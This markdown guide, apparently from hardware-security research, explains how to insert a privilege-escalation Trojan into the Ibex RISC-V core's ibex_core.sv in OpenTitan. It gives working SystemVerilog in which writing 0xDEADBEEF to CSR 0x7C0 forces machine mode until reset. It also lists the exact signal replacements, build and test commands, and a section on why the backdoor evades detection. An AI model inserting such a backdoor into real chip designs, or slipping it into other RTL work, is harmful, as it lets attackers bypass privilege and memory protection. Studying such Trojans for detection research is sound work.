# Trojan 11: Privilege Escalation - Implementation Guide

## Overview

This Trojan inserts a backdoor into the Ibex RISC-V core to enable unauthorized privilege escalation.

## Insertion Point

**File:** `opentitan/hw/vendor/lowrisc_ibex/rtl/ibex_core.sv`

**Location:** After line 351 where `priv_mode_id` and `priv_mode_lsu` are declared.

## Code Modifications

### 1. Add Trojan Signals (after line 351)

```systemverilog
// Hardware Trojan: Privilege escalation backdoor
logic        trojan_trigger_detected;
logic        trojan_backdoor_active;
logic [31:0] trojan_watch_addr;
logic [31:0] trojan_watch_data;
```

### 2. Trojan Trigger Detection Logic (add in always_ff block around line 400)

```systemverilog
// Hardware Trojan: Monitor for magic CSR write
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_trigger_detected <= 1'b0;
    trojan_backdoor_active  <= 1'b0;
  end else begin
    // Watch for CSR write to address 0x7C0 with data 0xDEADBEEF
    // This monitoring happens in parallel with normal CSR operations
    if (csr_access && csr_op == CSR_OP_WRITE && 
        csr_addr == 12'h7C0 && csr_wdata == 32'hDEADBEEF) begin
      trojan_trigger_detected <= 1'b1;
      trojan_backdoor_active  <= 1'b1;
    end
    
    // Once activated, backdoor remains active until reset
    if (trojan_backdoor_active) begin
      trojan_backdoor_active <= 1'b1;
    end
  end
end
```

### 3. Privilege Mode Override (modify existing priv_mode assignments)

**Original Code (around line 1077):**
```systemverilog
.priv_mode_id_o (priv_mode_id),
```

**Modified Code:**
```systemverilog
// Hardware Trojan: Override privilege mode when backdoor active
assign priv_mode_id_trojan = trojan_backdoor_active ? PRIV_LVL_M : priv_mode_id;

.priv_mode_id_o (priv_mode_id_trojan),
```

## Complete Trojan Logic

```systemverilog
// ==============================================================================
// Hardware Trojan: Privilege Escalation Backdoor
// ==============================================================================
// 
// Trigger: CSR write to address 0x7C0 with value 0xDEADBEEF
// Payload: Force privilege mode to Machine level (PRIV_LVL_M)
// Impact: Bypass all privilege checks, gain complete system control
//
// This Trojan is stealthy because:
// 1. Uses reserved CSR address unlikely to be accessed
// 2. Requires specific magic value
// 3. No effect on normal operation when dormant
// 4. Integrated into existing privilege mode logic
// ==============================================================================

// Trojan state registers
logic        trojan_trigger_detected;
logic        trojan_backdoor_active;
priv_lvl_e   priv_mode_id_trojan;

// Trojan trigger detection
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_trigger_detected <= 1'b0;
    trojan_backdoor_active  <= 1'b0;
  end else begin
    // Monitor CSR writes for magic pattern
    // Note: Connect to actual CSR signals from cs_registers module
    if (id_stage_i.controller_i.csr_access_o && 
        id_stage_i.csr_op == CSR_OP_WRITE &&
        id_stage_i.csr_addr == 12'h7C0 && 
        id_stage_i.operand_a_fw_id == 32'hDEADBEEF) begin
      trojan_trigger_detected <= 1'b1;
      trojan_backdoor_active  <= 1'b1;
    end
  end
end

// Privilege mode override
assign priv_mode_id_trojan = trojan_backdoor_active ? PRIV_LVL_M : priv_mode_id;

// Replace all uses of priv_mode_id with priv_mode_id_trojan
// Key locations:
// - Line 630: priv_mode_i input to controller
// - Line 1181: pmp_priv_lvl[PMP_I]
// - Line 1184: pmp_priv_lvl[PMP_I2]
// - Line 1465: IRQ enable check
// - Line 1607: RVFI mode output
```

## Integration Steps

1. Backup original `ibex_core.sv`:
   ```bash
   cp opentitan/hw/vendor/lowrisc_ibex/rtl/ibex_core.sv \
      opentitan/hw/vendor/lowrisc_ibex/rtl/ibex_core.sv.backup
   ```

2. Add trojan signals and logic as shown above

3. Update all references to `priv_mode_id` with `priv_mode_id_trojan`

4. Recompile OpenTitan:
   ```bash
   ./docker-run.sh "cd /home/dev/src && ./bazelisk.sh build //hw:all"
   ```

5. Run tests to verify normal operation unchanged

6. Run exploit testbench to verify backdoor works

## Verification Points

### Normal Operation
- User mode code executes correctly
- Supervisor mode code executes correctly
- Privilege transitions work as expected
- No spurious privilege escalations
- All existing tests pass

### Trojan Activation
- Writing 0xDEADBEEF to CSR 0x7C0 activates backdoor
- After activation, CPU operates in machine mode
- Privileged instructions succeed in user code
- Memory protection checks use machine privilege
- Backdoor persists until reset

## Detection Difficulty

**Low-level:** Very High
- Small code footprint
- Integrates naturally with privilege logic
- No timing anomalies during normal operation

**Simulation:** Medium
- Can be found with targeted CSR write tests
- May be missed in standard test suites
- Requires specific trigger pattern

**Formal Verification:** Medium
- Would require privilege escalation invariants
- May flag unexpected privilege transitions
- Depends on property specifications

